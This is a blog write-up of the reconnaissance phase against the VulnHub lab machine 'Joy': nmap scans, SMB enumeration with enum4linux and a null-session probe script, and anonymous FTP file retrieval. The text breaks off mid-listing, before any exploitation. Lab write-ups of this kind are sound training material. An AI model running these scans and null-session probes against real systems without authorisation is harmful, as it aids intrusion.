<meta charset="UTF-8">
<link rel="stylesheet" href="../../../index.css"/>
<link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
<script src="../../../highlight/highlight.min.js"></script>
<script>hljs.highlightAll();</script>

<h1>/f0c1s/blog/sec/vulnhub/digitalworld.local:Joy</h1>

<p>
    <a href="../../../index.html">/blog</a>
    <a href="../../index.html">Security</a>
    <a href="../index.html">VulnHub</a>
    <a href="../../../sec/vulnhub/digitalworld.local-Joy/joy.html">+ digitalworld.local:Joy - 2021.12.21 Tuesday</a>
</p>

<h1 id="digitalworld.local-joy">digitalworld.local Joy</h1>
<pre><code>Does penetration testing spark joy? If it does, this machine is for you.

This machine is full of services, full of fun, but how many ways are there to align the stars? Perhaps, just like the child in all of us, we may find joy in a playground such as this.

This is somewhat OSCP-like for learning value, but is nowhere as easy to complete with an OSCP exam timeframe. But if you found this box because of preparation for the OSCP, you might as well try harder. :-)

If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): Joy is (#1): https://www.youtube.com/watch?v=9AvWs2X-bEA, (#2): something that should be replicated, (#3): what happens when you clean out seemingly &quot;hidden&quot; closets.

Note: There are at least two reliable ways of obtaining user privileges and rooting this machine. Have fun. :-)

Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment. </code></pre>
<p><a href="http://www.vulnhub.com/entry/digitalworldlocal-joy,298/">VulnHub</a> <a href="http://www.vulnhub.com/series/digitalworldlocal,182/">Series: digitalworld.local</a></p>
<figure>
<img src="0.running-virtualbox.png" alt="" /><figcaption>0.running-virtualbox</figcaption>
</figure>
<p>This box was started on 2021.12.08, but I couldn’t complete it. So I am doing it on 2021.12.21.</p>
<h2 id="information-gathering">Information Gathering</h2>
<pre class="shell"><code>fping -aAqg 192.168.56.1/24 | tee fping.txt
192.168.56.1
192.168.56.2
192.168.56.70
192.168.56.71 # on 2021.12.22, the IP has changed to 76</code></pre>
<p><a href="http://blog.f0c1s.com/sec/tools/fping.html">tool fping</a></p>
<pre class="shell"><code>export RHOST=&quot;192.168.56.71&quot;                                     
export LHOST=&quot;192.168.56.70&quot;
export LPORT=&quot;443&quot;</code></pre>
<figure>
<img src="1.fping.png" alt="" /><figcaption>1.fping</figcaption>
</figure>
<pre><code>nmap $RHOST -n | tee nmap.default.txt     
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-08 11:02 IST
Nmap scan report for 192.168.56.71
Host is up (0.00028s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
465/tcp open  smtps
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds


nmap $RHOST -n -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-08 11:03 IST
Nmap scan report for 192.168.56.71
Host is up (0.00011s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.2.10
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2016-07-19 20:03  ossec/
|_
110/tcp open  pop3        Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_pop3-capabilities: PIPELINING SASL STLS RESP-CODES TOP CAPA AUTH-RESP-CODE UIDL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_imap-capabilities: Pre-login have LOGIN-REFERRALS STARTTLS OK more LITERAL+ ENABLE LOGINDISABLEDA0001 capabilities listed ID IMAP4rev1 post-login IDLE SASL-IR
445/tcp open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
465/tcp open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
587/tcp open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
993/tcp open  ssl/imap    Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_imap-capabilities: Pre-login have LOGIN-REFERRALS OK more LITERAL+ ENABLE AUTH=PLAINA0001 capabilities listed ID IMAP4rev1 post-login IDLE SASL-IR
995/tcp open  ssl/pop3    Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_pop3-capabilities: PIPELINING SASL(PLAIN) USER RESP-CODES TOP CAPA AUTH-RESP-CODE UIDL
Service Info: Hosts: The,  JOY.localdomain, 127.0.1.1, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: joy
|   NetBIOS computer name: JOY\x00
|   Domain name: \x00
|   FQDN: joy
|_  System time: 2021-12-08T19:03:43+08:00
|_nbstat: NetBIOS name: JOY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
|_clock-skew: mean: 2h50m00s, deviation: 4h37m07s, median: 5h29m59s
| smb2-time: 
|   date: 2021-12-08T11:03:43
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.38 seconds
</code></pre>
<p><a href="1.out-nmap-deep-scan.txt">Chckout ./1.out-nmap-deep-scan.txt</a></p>
<figure>
<img src="2.nmap.png" alt="" /><figcaption>2.nmap</figcaption>
</figure>
<blockquote>
<p>A deeper nmap scan for enumeration and vulnerability scan</p>
</blockquote>
<pre><code>nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 -sVC --script=vuln,*enum* | tee nmap.vuln-enum.txt
...
Nmap done: 1 IP address (1 host up) scanned in 332.78 seconds</code></pre>
<p><a href="2.out-nmap-vuln-enum-scan.txt">Checkout ./2.out-nmap-vuln-enum-scan.txt</a></p>
<blockquote>
<p>http://192.168.56.71/</p>
</blockquote>
<figure>
<img src="3.browse-web.png" alt="" /><figcaption>3.browse-web</figcaption>
</figure>
<blockquote>
<p>http://192.168.56.71/ossec/</p>
</blockquote>
<figure>
<img src="4.browse-web-ossec.png" alt="" /><figcaption>4.browse-web-ossec</figcaption>
</figure>
<p>Due the way the web server is setup, feroxbuster and nikto didn’t find anything useful.</p>
<p>The app “ossec” has version 0.8</p>
<blockquote>
<p>searchsploit ossec 0.8</p>
</blockquote>
<figure>
<img src="5.searchsploit-ossec.png" alt="" /><figcaption>5.searchsploit-ossec</figcaption>
</figure>
<p>This is almost useless. I might have to modify the exploit, but that is when nothing else works.</p>
<figure>
<img src="6.ftp.png" alt="" /><figcaption>6.ftp</figcaption>
</figure>
<pre><code>smbmap -H $RHOST -u &quot;&quot;                                                 
[+] Guest session       IP: 192.168.56.71:445   Name: joy                                               
        Disk        Permissions     Comment
        ----        -----------     -------
        print$      NO ACCESS       Printer Drivers
        IPC$        NO ACCESS       IPC Service (Samba 4.5.12-Debian)</code></pre>
<figure>
<img src="7.smbmap.png" alt="" /><figcaption>7.smbmap</figcaption>
</figure>
<pre><code>smbclient -N -L $RHOST --option=&quot;client min protocol&quot;=LANMAN1

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.5.12-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            JOY</code></pre>
<figure>
<img src="8.smbclient.png" alt="" /><figcaption>8.smbclient</figcaption>
</figure>
<blockquote>
<p>nmap smb-os-discovery</p>
</blockquote>
<pre><code>nmap $RHOST -n -p139,445 -Pn -T4 --min-rate=5000 -sVC --script=smb-os-discovery | tee nmap.smb-os-discovery.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-08 12:18 IST
Nmap scan report for 192.168.56.71
Host is up (0.00034s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
Service Info: Host: JOY

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: joy
|   NetBIOS computer name: JOY\x00
|   Domain name: \x00
|   FQDN: joy
|_  System time: 2021-12-08T20:18:23+08:00</code></pre>
<figure>
<img src="9.nmap-smb-os-discovery.png" alt="" /><figcaption>9.nmap-smb-os-discovery</figcaption>
</figure>
<blockquote>
<p>nmblookup</p>
</blockquote>
<pre><code>nmblookup -A $RHOST | tee nmblookup.-A.txt                                                                     
Looking up status of 192.168.56.71
        JOY             &lt;00&gt; -         B &lt;ACTIVE&gt; 
        JOY             &lt;03&gt; -         B &lt;ACTIVE&gt; 
        JOY             &lt;20&gt; -         B &lt;ACTIVE&gt; 
        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; 
        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; 
        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt; 
        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; 

        MAC Address = 00-00-00-00-00-00</code></pre>
<figure>
<img src="10.nmblookup.png" alt="" /><figcaption>10.nmblookup</figcaption>
</figure>
<blockquote>
<p>nbtscan</p>
</blockquote>
<pre><code>nbtscan -r $RHOST | tee nbtscan.txt                   
Doing NBT name scan for addresses from 192.168.56.71

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.56.71    JOY              &lt;server&gt;  JOY              00:00:00:00:00:00</code></pre>
<figure>
<img src="11.nbtscan.png" alt="" /><figcaption>11.nbtscan</figcaption>
</figure>
<blockquote>
<p>enum4linux</p>
</blockquote>
<p>This tool is a bit outdated, but so is this machine.</p>
<pre><code>enum4linux -a $RHOST | tee enum4linux.txt
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Dec  8 12:24:31 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.56.71
RID Range ........ 500-550,1000-1050
Username ......... &#39;&#39;
Password ......... &#39;&#39;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 192.168.56.71    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 192.168.56.71    |
 ============================================= 
Looking up status of 192.168.56.71
        JOY             &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
        JOY             &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
        JOY             &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 192.168.56.71    |
 ====================================== 
[+] Server 192.168.56.71 allows sessions using username &#39;&#39;, password &#39;&#39;

 ============================================ 
|    Getting domain SID for 192.168.56.71    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can&#39;t determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 192.168.56.71    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.56.71 from smbclient: 
[+] Got OS info for 192.168.56.71 from srvinfo:
        JOY            Wk Sv PrQ Unx NT SNT Samba 4.5.12-Debian
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================== 
|    Users on 192.168.56.71    |
 ============================== 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ========================================== 
|    Share Enumeration on 192.168.56.71    |
 ========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.5.12-Debian)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.56.71
//192.168.56.71/print$  Mapping: DENIED, Listing: N/A
//192.168.56.71/IPC$    [E] Can&#39;t understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 192.168.56.71    |
 ===================================================== 


[+] Attaching to 192.168.56.71 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] JOY
        [+] Builtin

[+] Password Info for Domain: JOY

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 

 ======================================================================== 
|    Users on 192.168.56.71 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2865746926-266277720-3235246268
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;&#39;
S-1-22-1-1000 Unix User\patrick (Local User)
S-1-22-1-1001 Unix User\ftp (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username &#39;&#39;, password &#39;&#39;
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[+] Enumerating users using SID S-1-5-21-2865746926-266277720-3235246268 and logon username &#39;&#39;, password &#39;&#39;
S-1-5-21-2865746926-266277720-3235246268-501 JOY\nobody (Local User)
S-1-5-21-2865746926-266277720-3235246268-513 JOY\None (Domain Group)

 ============================================== 
|    Getting printer info for 192.168.56.71    |
 ============================================== 
No printers returned.


enum4linux complete on Wed Dec  8 12:24:42 2021
</code></pre>
<p>A lot of output is discarded, manually.</p>
<figure>
<img src="12.enum4linux.png" alt="" /><figcaption>12.enum4linux</figcaption>
</figure>
<blockquote>
<p>Throwing rpc for no reason.</p>
</blockquote>
<pre><code>rpcdump.py $RHOST | tee rpcdump.txt         
Impacket v0.9.24.dev1+20210928.152630.ff7c521a - Copyright 2021 SecureAuth Corporation

[*] Retrieving endpoint list from 192.168.56.71
[-] Protocol failed: Could not connect: [Errno 111] Connection refused
[*] No endpoints found.
                                                                                                                   

rpcclient -N $RHOST         
Bad SMB2 signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 73 B2 60 65 58 CE E9 7A   18 C4 B5 BD 55 B0 68 1F   s.`eX..z ....U.h.
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED</code></pre>
<figure>
<img src="13.pray-and-fire-rpc.png" alt="" /><figcaption>13.pray-and-fire-rpc</figcaption>
</figure>
<blockquote>
<p>SMB null session script</p>
</blockquote>
<pre class="shell"><code>#/bin/bash

ip=$RHOST
shares=(&#39;C$&#39; &#39;D$&#39; &#39;ADMIN$&#39; &#39;IPC$&#39; &#39;PRINT$&#39; &#39;FAX$&#39; &#39;SYSVOL&#39; &#39;NETLOGON&#39;)

for share in ${shares[*]}; do
    output=$(smbclient -U &#39;%&#39; -N \\\\$ip\\$share -c &#39;&#39;) 

    if [[ -z $output ]]; then 
        echo &quot;[+] creating a null session is possible for $share&quot; # no output if command goes through, thus assuming that a session was created
    else
        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
    fi
done</code></pre>
<pre><code>tree connect failed: NT_STATUS_BAD_NETWORK_NAME
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
[+] creating a null session is possible for IPC$
tree connect failed: NT_STATUS_ACCESS_DENIED
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
tree connect failed: NT_STATUS_BAD_NETWORK_NAME</code></pre>
<figure>
<img src="14.smb-pipes-null-session-enumeration.png" alt="" /><figcaption>14.smb-pipes-null-session-enumeration</figcaption>
</figure>
<blockquote>
<p>smbclient with null session on IPC$</p>
</blockquote>
<pre><code>smbclient -U &#39;%&#39; -N \\\\$RHOST\\IPC$</code></pre>
<figure>
<img src="15.smbclient-IPC.png" alt="" /><figcaption>15.smbclient-IPC</figcaption>
</figure>
<figure>
<img src="16.smbclient-IPC-2.png" alt="" /><figcaption>16.smbclient-IPC-2</figcaption>
</figure>
<blockquote>
<p>smtp</p>
</blockquote>
<pre><code>nc -nvC $RHOST 25</code></pre>
<figure>
<img src="17.smtp-via-nc.png" alt="" /><figcaption>17.smtp-via-nc</figcaption>
</figure>
<blockquote>
<p>ftp again</p>
</blockquote>
<pre><code>mkdir -p ftp/{download,upload}

cd ftp

ls
download  upload

ftp -p $RHOST 21
Connected to 192.168.56.71.
220 The Good Tech Inc. FTP Server
Name (192.168.56.71:f0c1s): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; prompt off
Interactive mode off.
ftp&gt; mget *
local: upload/project_flamingo remote: upload/project_flamingo
227 Entering Passive Mode (192,168,56,71,180,21).
150 Opening BINARY mode data connection for upload/project_flamingo
226 Transfer complete
local: upload/project_polento remote: upload/project_polento
227 Entering Passive Mode (192,168,56,71,163,179).
150 Opening BINARY mode data connection for upload/project_polento
226 Transfer complete
local: upload/project_ronaldinho remote: upload/project_ronaldinho
227 Entering Passive Mode (192,168,56,71,160,215).
150 Opening BINARY mode data connection for upload/project_ronaldinho (20 bytes)
226 Transfer complete
20 bytes received in 0.00 secs (781.2500 kB/s)
local: upload/project_uno remote: upload/project_uno
227 Entering Passive Mode (192,168,56,71,135,129).
150 Opening BINARY mode data connection for upload/project_uno (5 bytes)
226 Transfer complete
5 bytes received in 0.00 secs (221.9460 kB/s)
local: upload/project_zoo remote: upload/project_zoo
227 Entering Passive Mode (192,168,56,71,164,159).
150 Opening BINARY mode data connection for upload/project_zoo (180 bytes)
226 Transfer complete
180 bytes received in 0.00 secs (2.0195 MB/s)
local: upload/project_armadillo remote: upload/project_armadillo
227 Entering Passive Mode (192,168,56,71,128,157).
150 Opening BINARY mode data connection for upload/project_armadillo
226 Transfer complete
local: upload/project_desperado remote: upload/project_desperado
227 Entering Passive Mode (192,168,56,71,162,135).
150 Opening BINARY mode data connection for upload/project_desperado (88 bytes)
226 Transfer complete
88 bytes received in 0.00 secs (3.9963 MB/s)
local: upload/project_emilio remote: upload/project_emilio
227 Entering Passive Mode (192,168,56,71,143,183).
150 Opening BINARY mode data connection for upload/project_emilio
226 Transfer complete
local: upload/project_woranto remote: upload/project_woranto
227 Entering Passive Mode (192,168,56,71,148,105).
150 Opening BINARY mode data connection for upload/project_woranto
226 Transfer complete
local: upload/project_sicko remote: upload/project_sicko
227 Entering Passive Mode (192,168,56,71,175,247).
150 Opening BINARY mode data connection for upload/project_sicko (55 bytes)
226 Transfer complete
55 bytes received in 0.00 secs (2.1855 MB/s)
local: upload/project_okacho remote: upload/project_okacho
227 Entering Passive Mode (192,168,56,71,155,115).
150 Opening BINARY mode data connection for upload/project_okacho
226 Transfer complete
local: upload/project_yolo remote: upload/project_yolo
227 Entering Passive Mode (192,168,56,71,148,39).
150 Opening BINARY mode data connection for upload/project_yolo (20 bytes)
226 Transfer complete
20 bytes received in 0.00 secs (813.8021 kB/s)
local: upload/project_bravado remote: upload/project_bravado
227 Entering Passive Mode (192,168,56,71,145,233).
150 Opening BINARY mode data connection for upload/project_bravado (25 bytes)
226 Transfer complete
25 bytes received in 0.00 secs (1017.2526 kB/s)
local: upload/project_toto remote: upload/project_toto
227 Entering Passive Mode (192,168,56,71,172,125).
150 Opening BINARY mode data connection for upload/project_toto (57 bytes)
226 Transfer complete
57 bytes received in 0.00 secs (2.3635 MB/s)
local: upload/reminder remote: upload/reminder
227 Entering Passive Mode (192,168,56,71,131,113).
150 Opening BINARY mode data connection for upload/reminder (24 bytes)
226 Transfer complete
24 bytes received in 0.00 secs (1019.0217 kB/s)
local: upload/project_komodo remote: upload/project_komodo
227 Entering Passive Mode (192,168,56,71,152,193).
150 Opening BINARY mode data connection for upload/project_komodo
226 Transfer complete
local: upload/project_luyano remote: upload/project_luyano
227 Entering Passive Mode (192,168,56,71,166,21).
150 Opening BINARY mode data connection for upload/project_luyano
226 Transfer complete
local: upload/project_vivino remote: upload/project_vivino
227 Entering Passive Mode (192,168,56,71,130,5).
150 Opening BINARY mode data connection for upload/project_vivino (9 bytes)
226 Transfer complete
9 bytes received in 0.01 secs (1.1450 kB/s)
local: upload/directory remote: upload/directory
227 Entering Passive Mode (192,168,56,71,165,139).
150 Opening BINARY mode data connection for upload/directory (6352 bytes)
226 Transfer complete
6352 bytes received in 0.00 secs (27.4106 MB/s)
local: upload/project_indigo remote: upload/project_indigo
227 Entering Passive Mode (192,168,56,71,177,35).
150 Opening BINARY mode data connection for upload/project_indigo (7 bytes)
226 Transfer complete
7 bytes received in 0.00 secs (46.8215 kB/s)
local: upload/project_malindo remote: upload/project_malindo
227 Entering Passive Mode (192,168,56,71,158,57).
150 Opening BINARY mode data connection for upload/project_malindo (8 bytes)
226 Transfer complete
8 bytes received in 0.00 secs (51.3980 kB/s)</code></pre>
<figure>
<img src="18.ftp-mget-all.png" alt="" /><figcaption>18.ftp-mget-all</figcaption>
</figure>
<pre><code>hostname -I: 192.168.42.7 192.168.56.70 192.168.66.66 10.0.4.15 
Wednesday 08 December 2021 12:56:05 PM IST 2021.12.08 12:56:05
f0c1s@kali:~/vuln-hubs/digitalworld.local/joy/ftp/upload $
ls -la          
total 64
drwxr-xr-x 2 f0c1s f0c1s 4096 Dec  8 12:54 .
drwxr-xr-x 4 f0c1s f0c1s 4096 Dec  8 12:53 ..
-rw-r--r-- 1 f0c1s f0c1s 6352 Dec  8 12:54 directory
-rw-r--r-- 1 f0c1s f0c1s    0 Dec  8 12:54 project_armadillo
-rw-r--r-- 1 f0c1s f0c1s   25 Dec  8 12:54 project_bravado
-rw-r--r-- 1 f0c1s f0c1s   88 Dec  8 12:54 project_desperado
-rw-r--r-- 1 f0c1s f0c1s    0 Dec  8 12:54 project_emilio
-rw-r--r-- 1 f0c1s f0c1s    0 Dec  8 12:54 project_flamingo
-rw-r--r-- 1 f0c1s f0c1s    7 Dec  8 12:54 project_indigo
-rw-r--r-- 1 f0c1s f0c1s    0 Dec  8 12:54 project_komodo
-rw-r--r-- 1 f0c1s f0c1s    0 Dec  8 12:54 project_luyano
-rw-r--r-- 1 f0c1s f0c1s    8 Dec  8 12:54 project_malindo
-rw-r--r-- 1 f0c1s f0c1s    0 Dec  8 12:54 project_okacho
-rw-r--r-- 1 f0c1s f0c1s    0 Dec  8 12:54 project_polento
-rw-r--r-- 1 f0c1s f0c1s   20 Dec  8 12:54 project_ronaldinho
-rw-r--r-- 1 f0c1s f0c1s   55 Dec  8 12:54 project_sicko
-rw-r--r-- 1 f0c1s f0c1s   57 Dec  8 12:54 project_toto
-rw-r--r-- 1 f0c1s f0c1s    5 Dec  8 12:54 project_uno
-rw-r--r-- 1 f0c1s f0c1s    9 Dec  8 12:54 project_vivino
-rw-r--r-- 1 f0c1s f0c1s    0 Dec  8 12:54 project_woranto
-rw-r--r-- 1 f0c1s f0c1s   20 Dec  8 12:54 project_yolo
-rw-r--r-- 1 f0c1s f0c1s  180 Dec  8 12:54 project_zoo
-rw-r--r-- 1 f0c1s f0c1s   24 Dec  8 12:54 reminder
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 192.168.66.66 10.0.4.15 
Wednesday 08 December 2021 12:56:07 PM IST 2021.12.08 12:56:07
f0c1s@kali:~/vuln-hubs/digitalworld.local/joy/ftp/upload $
cat directory              
Patrick&#39;s Directory

total 196
drwxr-xr-x 18 patrick patrick 4096 Dec  8 20:50 .
drwxr-xr-x  4 root    root    4096 Jan  6  2019 ..
-rw-r--r--  1 patrick patrick    0 Dec  8 19:25 3DT7asZkXJJV3fDY3fW5fJaYnr73KCaL.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 20:50 4JjYnfUy6D2dqUUHuPjom53zXm5cgnAZ9ffbWm5KUg1XjnyDftD1EqMoHkEswL98.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 20:50 4nVwW4B4i28YDACtCKBv9ejOeHAAoURy.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 19:30 58I9yEHfwr1OCK6A8hF2UsLAb4G0JhITwkQOGWKZrQVqzeif4Vsujp9Irmsyb9gh.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 19:50 5okZnXlrp2qfGaTIJTJ2ZDwq1cVG006O.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 19:20 7bynKSib8RUtVvDaciGL6r3z0HB01E4zBZVQWAx8gwPeaM1jtPrMxlBdgkBr9b33.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 20:15 7UJipOMC6nu46F9g72hVmdeIRvLRrYTxIwIEywhvF6msMAS3PWOsm5YmaT2gVn2Z.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 19:10 8RQkRes9I4PZI3rA724epqGPTSdwEeeY6qrzKBxRJlu17ipUkttjW4yLkNlYmaqw.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 20:35 9naNLwxOEB8Q79hpaKi0MDNq3huTeEy2.txt
-rw-r--r--  1 patrick patrick    0 Dec  8 19:10 AGbiAJBP8D3hVsHQwimUHXh6o32lHigZ.txt
-rw-------  1 patrick patrick  185 Jan 28  2019 .bash_history
-rw-r--r--  1 patrick patrick  220 Dec 23  2018 .bash_logout
-rw-r--r--  1 patrick patrick 3526 Dec 23  2018 .bashrc
-rw-r--r--  1 patrick patrick   24 Dec  8 20:25 BPCj5D1nqXyPGtNYWJrorA5O2H4OMAnTBGDuwwDFivrirKfHZdO586mNh9moTfOp.txt
-rw-r--r--  1 patrick patrick   24 Dec  8 19:15 bxWu8bAcsbtwpBSxGnVHNu4UFGCI2xjSvnSXLPqIMStf0YkqLKa41HQ6Q2QdZLYw.txt
